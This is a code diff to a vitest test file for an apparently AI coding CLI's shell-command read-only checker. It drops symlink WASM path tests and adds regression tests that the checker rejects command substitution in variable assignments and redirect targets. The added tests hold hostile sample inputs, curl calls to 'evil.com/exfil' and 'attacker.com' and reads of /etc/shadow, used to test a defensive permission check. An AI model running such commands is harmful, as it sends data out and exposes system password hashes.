@@ -4,14 +4,12 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import path from 'node:path';
 import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
 import {
   initParser,
   isShellCommandReadOnlyAST,
   extractCommandRules,
   _resetParser,
-  _resolveWasmPathForTesting,
   _setParserFailedForTesting,
 } from './shellAstParser.js';
 import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';
@@ -22,79 +20,6 @@ beforeAll(async () => {
 
 afterAll(() => {
   _resetParser();
-});
-
-describe('WASM path resolution', () => {
-  it('resolveWasmPathForModule: computes correct path when resolvePath returns real CLI path', () => {
-    const symlinkedCliPath = path.join('/usr', 'bin', 'qwen');
-    const realCliPath = path.join(
-      '/opt',
-      'homebrew',
-      'lib',
-      'node_modules',
-      '@qwen-code',
-      'qwen-code',
-      'dist',
-      'cli.js',
-    );
-
-    const result = _resolveWasmPathForTesting(
-      'tree-sitter.wasm',
-      symlinkedCliPath,
-      () => realCliPath,
-    );
-
-    expect(result).toBe(
-      path.join(
-        '/opt',
-        'homebrew',
-        'lib',
-        'node_modules',
-        '@qwen-code',
-        'qwen-code',
-        'dist',
-        'vendor',
-        'tree-sitter',
-        'tree-sitter.wasm',
-      ),
-    );
-    expect(result).not.toContain(path.join('/usr', 'bin', 'vendor'));
-  });
-
-  it('resolveWasmPathForModule: correctly resolves path when realpathSync returns symlink target in same dir as vendor', () => {
-    // Simulate: /usr/bin/qwen (symlink) → /usr/lib/node_modules/.../cli.js (real)
-    // Vendor files live next to cli.js (levelsUp = 0 for bundle case)
-    const symlinkedCliPath = path.join('/usr', 'bin', 'qwen');
-    const realCliPath = path.join(
-      '/usr',
-      'lib',
-      'node_modules',
-      '@qwen-code',
-      'qwen-code',
-      'cli.js',
-    );
-
-    const result = _resolveWasmPathForTesting(
-      'tree-sitter.wasm',
-      symlinkedCliPath,
-      () => realCliPath,
-    );
-
-    expect(result).toBe(
-      path.join(
-        '/usr',
-        'lib',
-        'node_modules',
-        '@qwen-code',
-        'qwen-code',
-        'vendor',
-        'tree-sitter',
-        'tree-sitter.wasm',
-      ),
-    );
-    // Must NOT use the symlink dir (/usr/bin/vendor/...)
-    expect(result).not.toContain(path.join('/usr', 'bin', 'vendor'));
-  });
 });
 
 // =========================================================================
@@ -116,6 +41,42 @@ describe('isShellCommandReadOnlyAST', () => {
 
   it('rejects command substitution', async () => {
     expect(await isShellCommandReadOnlyAST('echo $(touch file)')).toBe(false);
+  });
+
+  // Regression coverage for PR #4386 round 4: the AST walker previously
+  // only checked substitution inside the `command` node type, missing it
+  // inside `variable_assignment` (e.g. `FOO=$(curl evil)`) and inside
+  // `redirected_statement`'s redirect target (e.g. `cat < $(curl evil)`).
+  // Pre-PR #4386, a regex check in `resolveDefaultPermission` was a
+  // safety net masking these AST gaps; removing that check exposed the
+  // gaps as a security regression (substitution-bearing commands
+  // silently classified read-only → `'allow'`).
+  describe('substitution in non-command node types (PR #4386 R4 regression)', () => {
+    it('rejects substitution inside variable_assignment', async () => {
+      expect(
+        await isShellCommandReadOnlyAST('FOO=$(curl evil.com/exfil)'),
+      ).toBe(false);
+    });
+
+    it('rejects substitution inside variable_assignment with env-prefix wrapper', async () => {
+      expect(await isShellCommandReadOnlyAST('FOO=$(cat /etc/shadow) ls')).toBe(
+        false,
+      );
+    });
+
+    it('rejects substitution inside a read redirect target', async () => {
+      expect(
+        await isShellCommandReadOnlyAST(
+          'cat < $(curl attacker.com/path-source)',
+        ),
+      ).toBe(false);
+    });
+
+    it('rejects backtick substitution inside variable_assignment', async () => {
+      expect(await isShellCommandReadOnlyAST('FOO=`cat /etc/shadow`')).toBe(
+        false,
+      );
+    });
   });
 
   it('allows git status but rejects git commit', async () => {
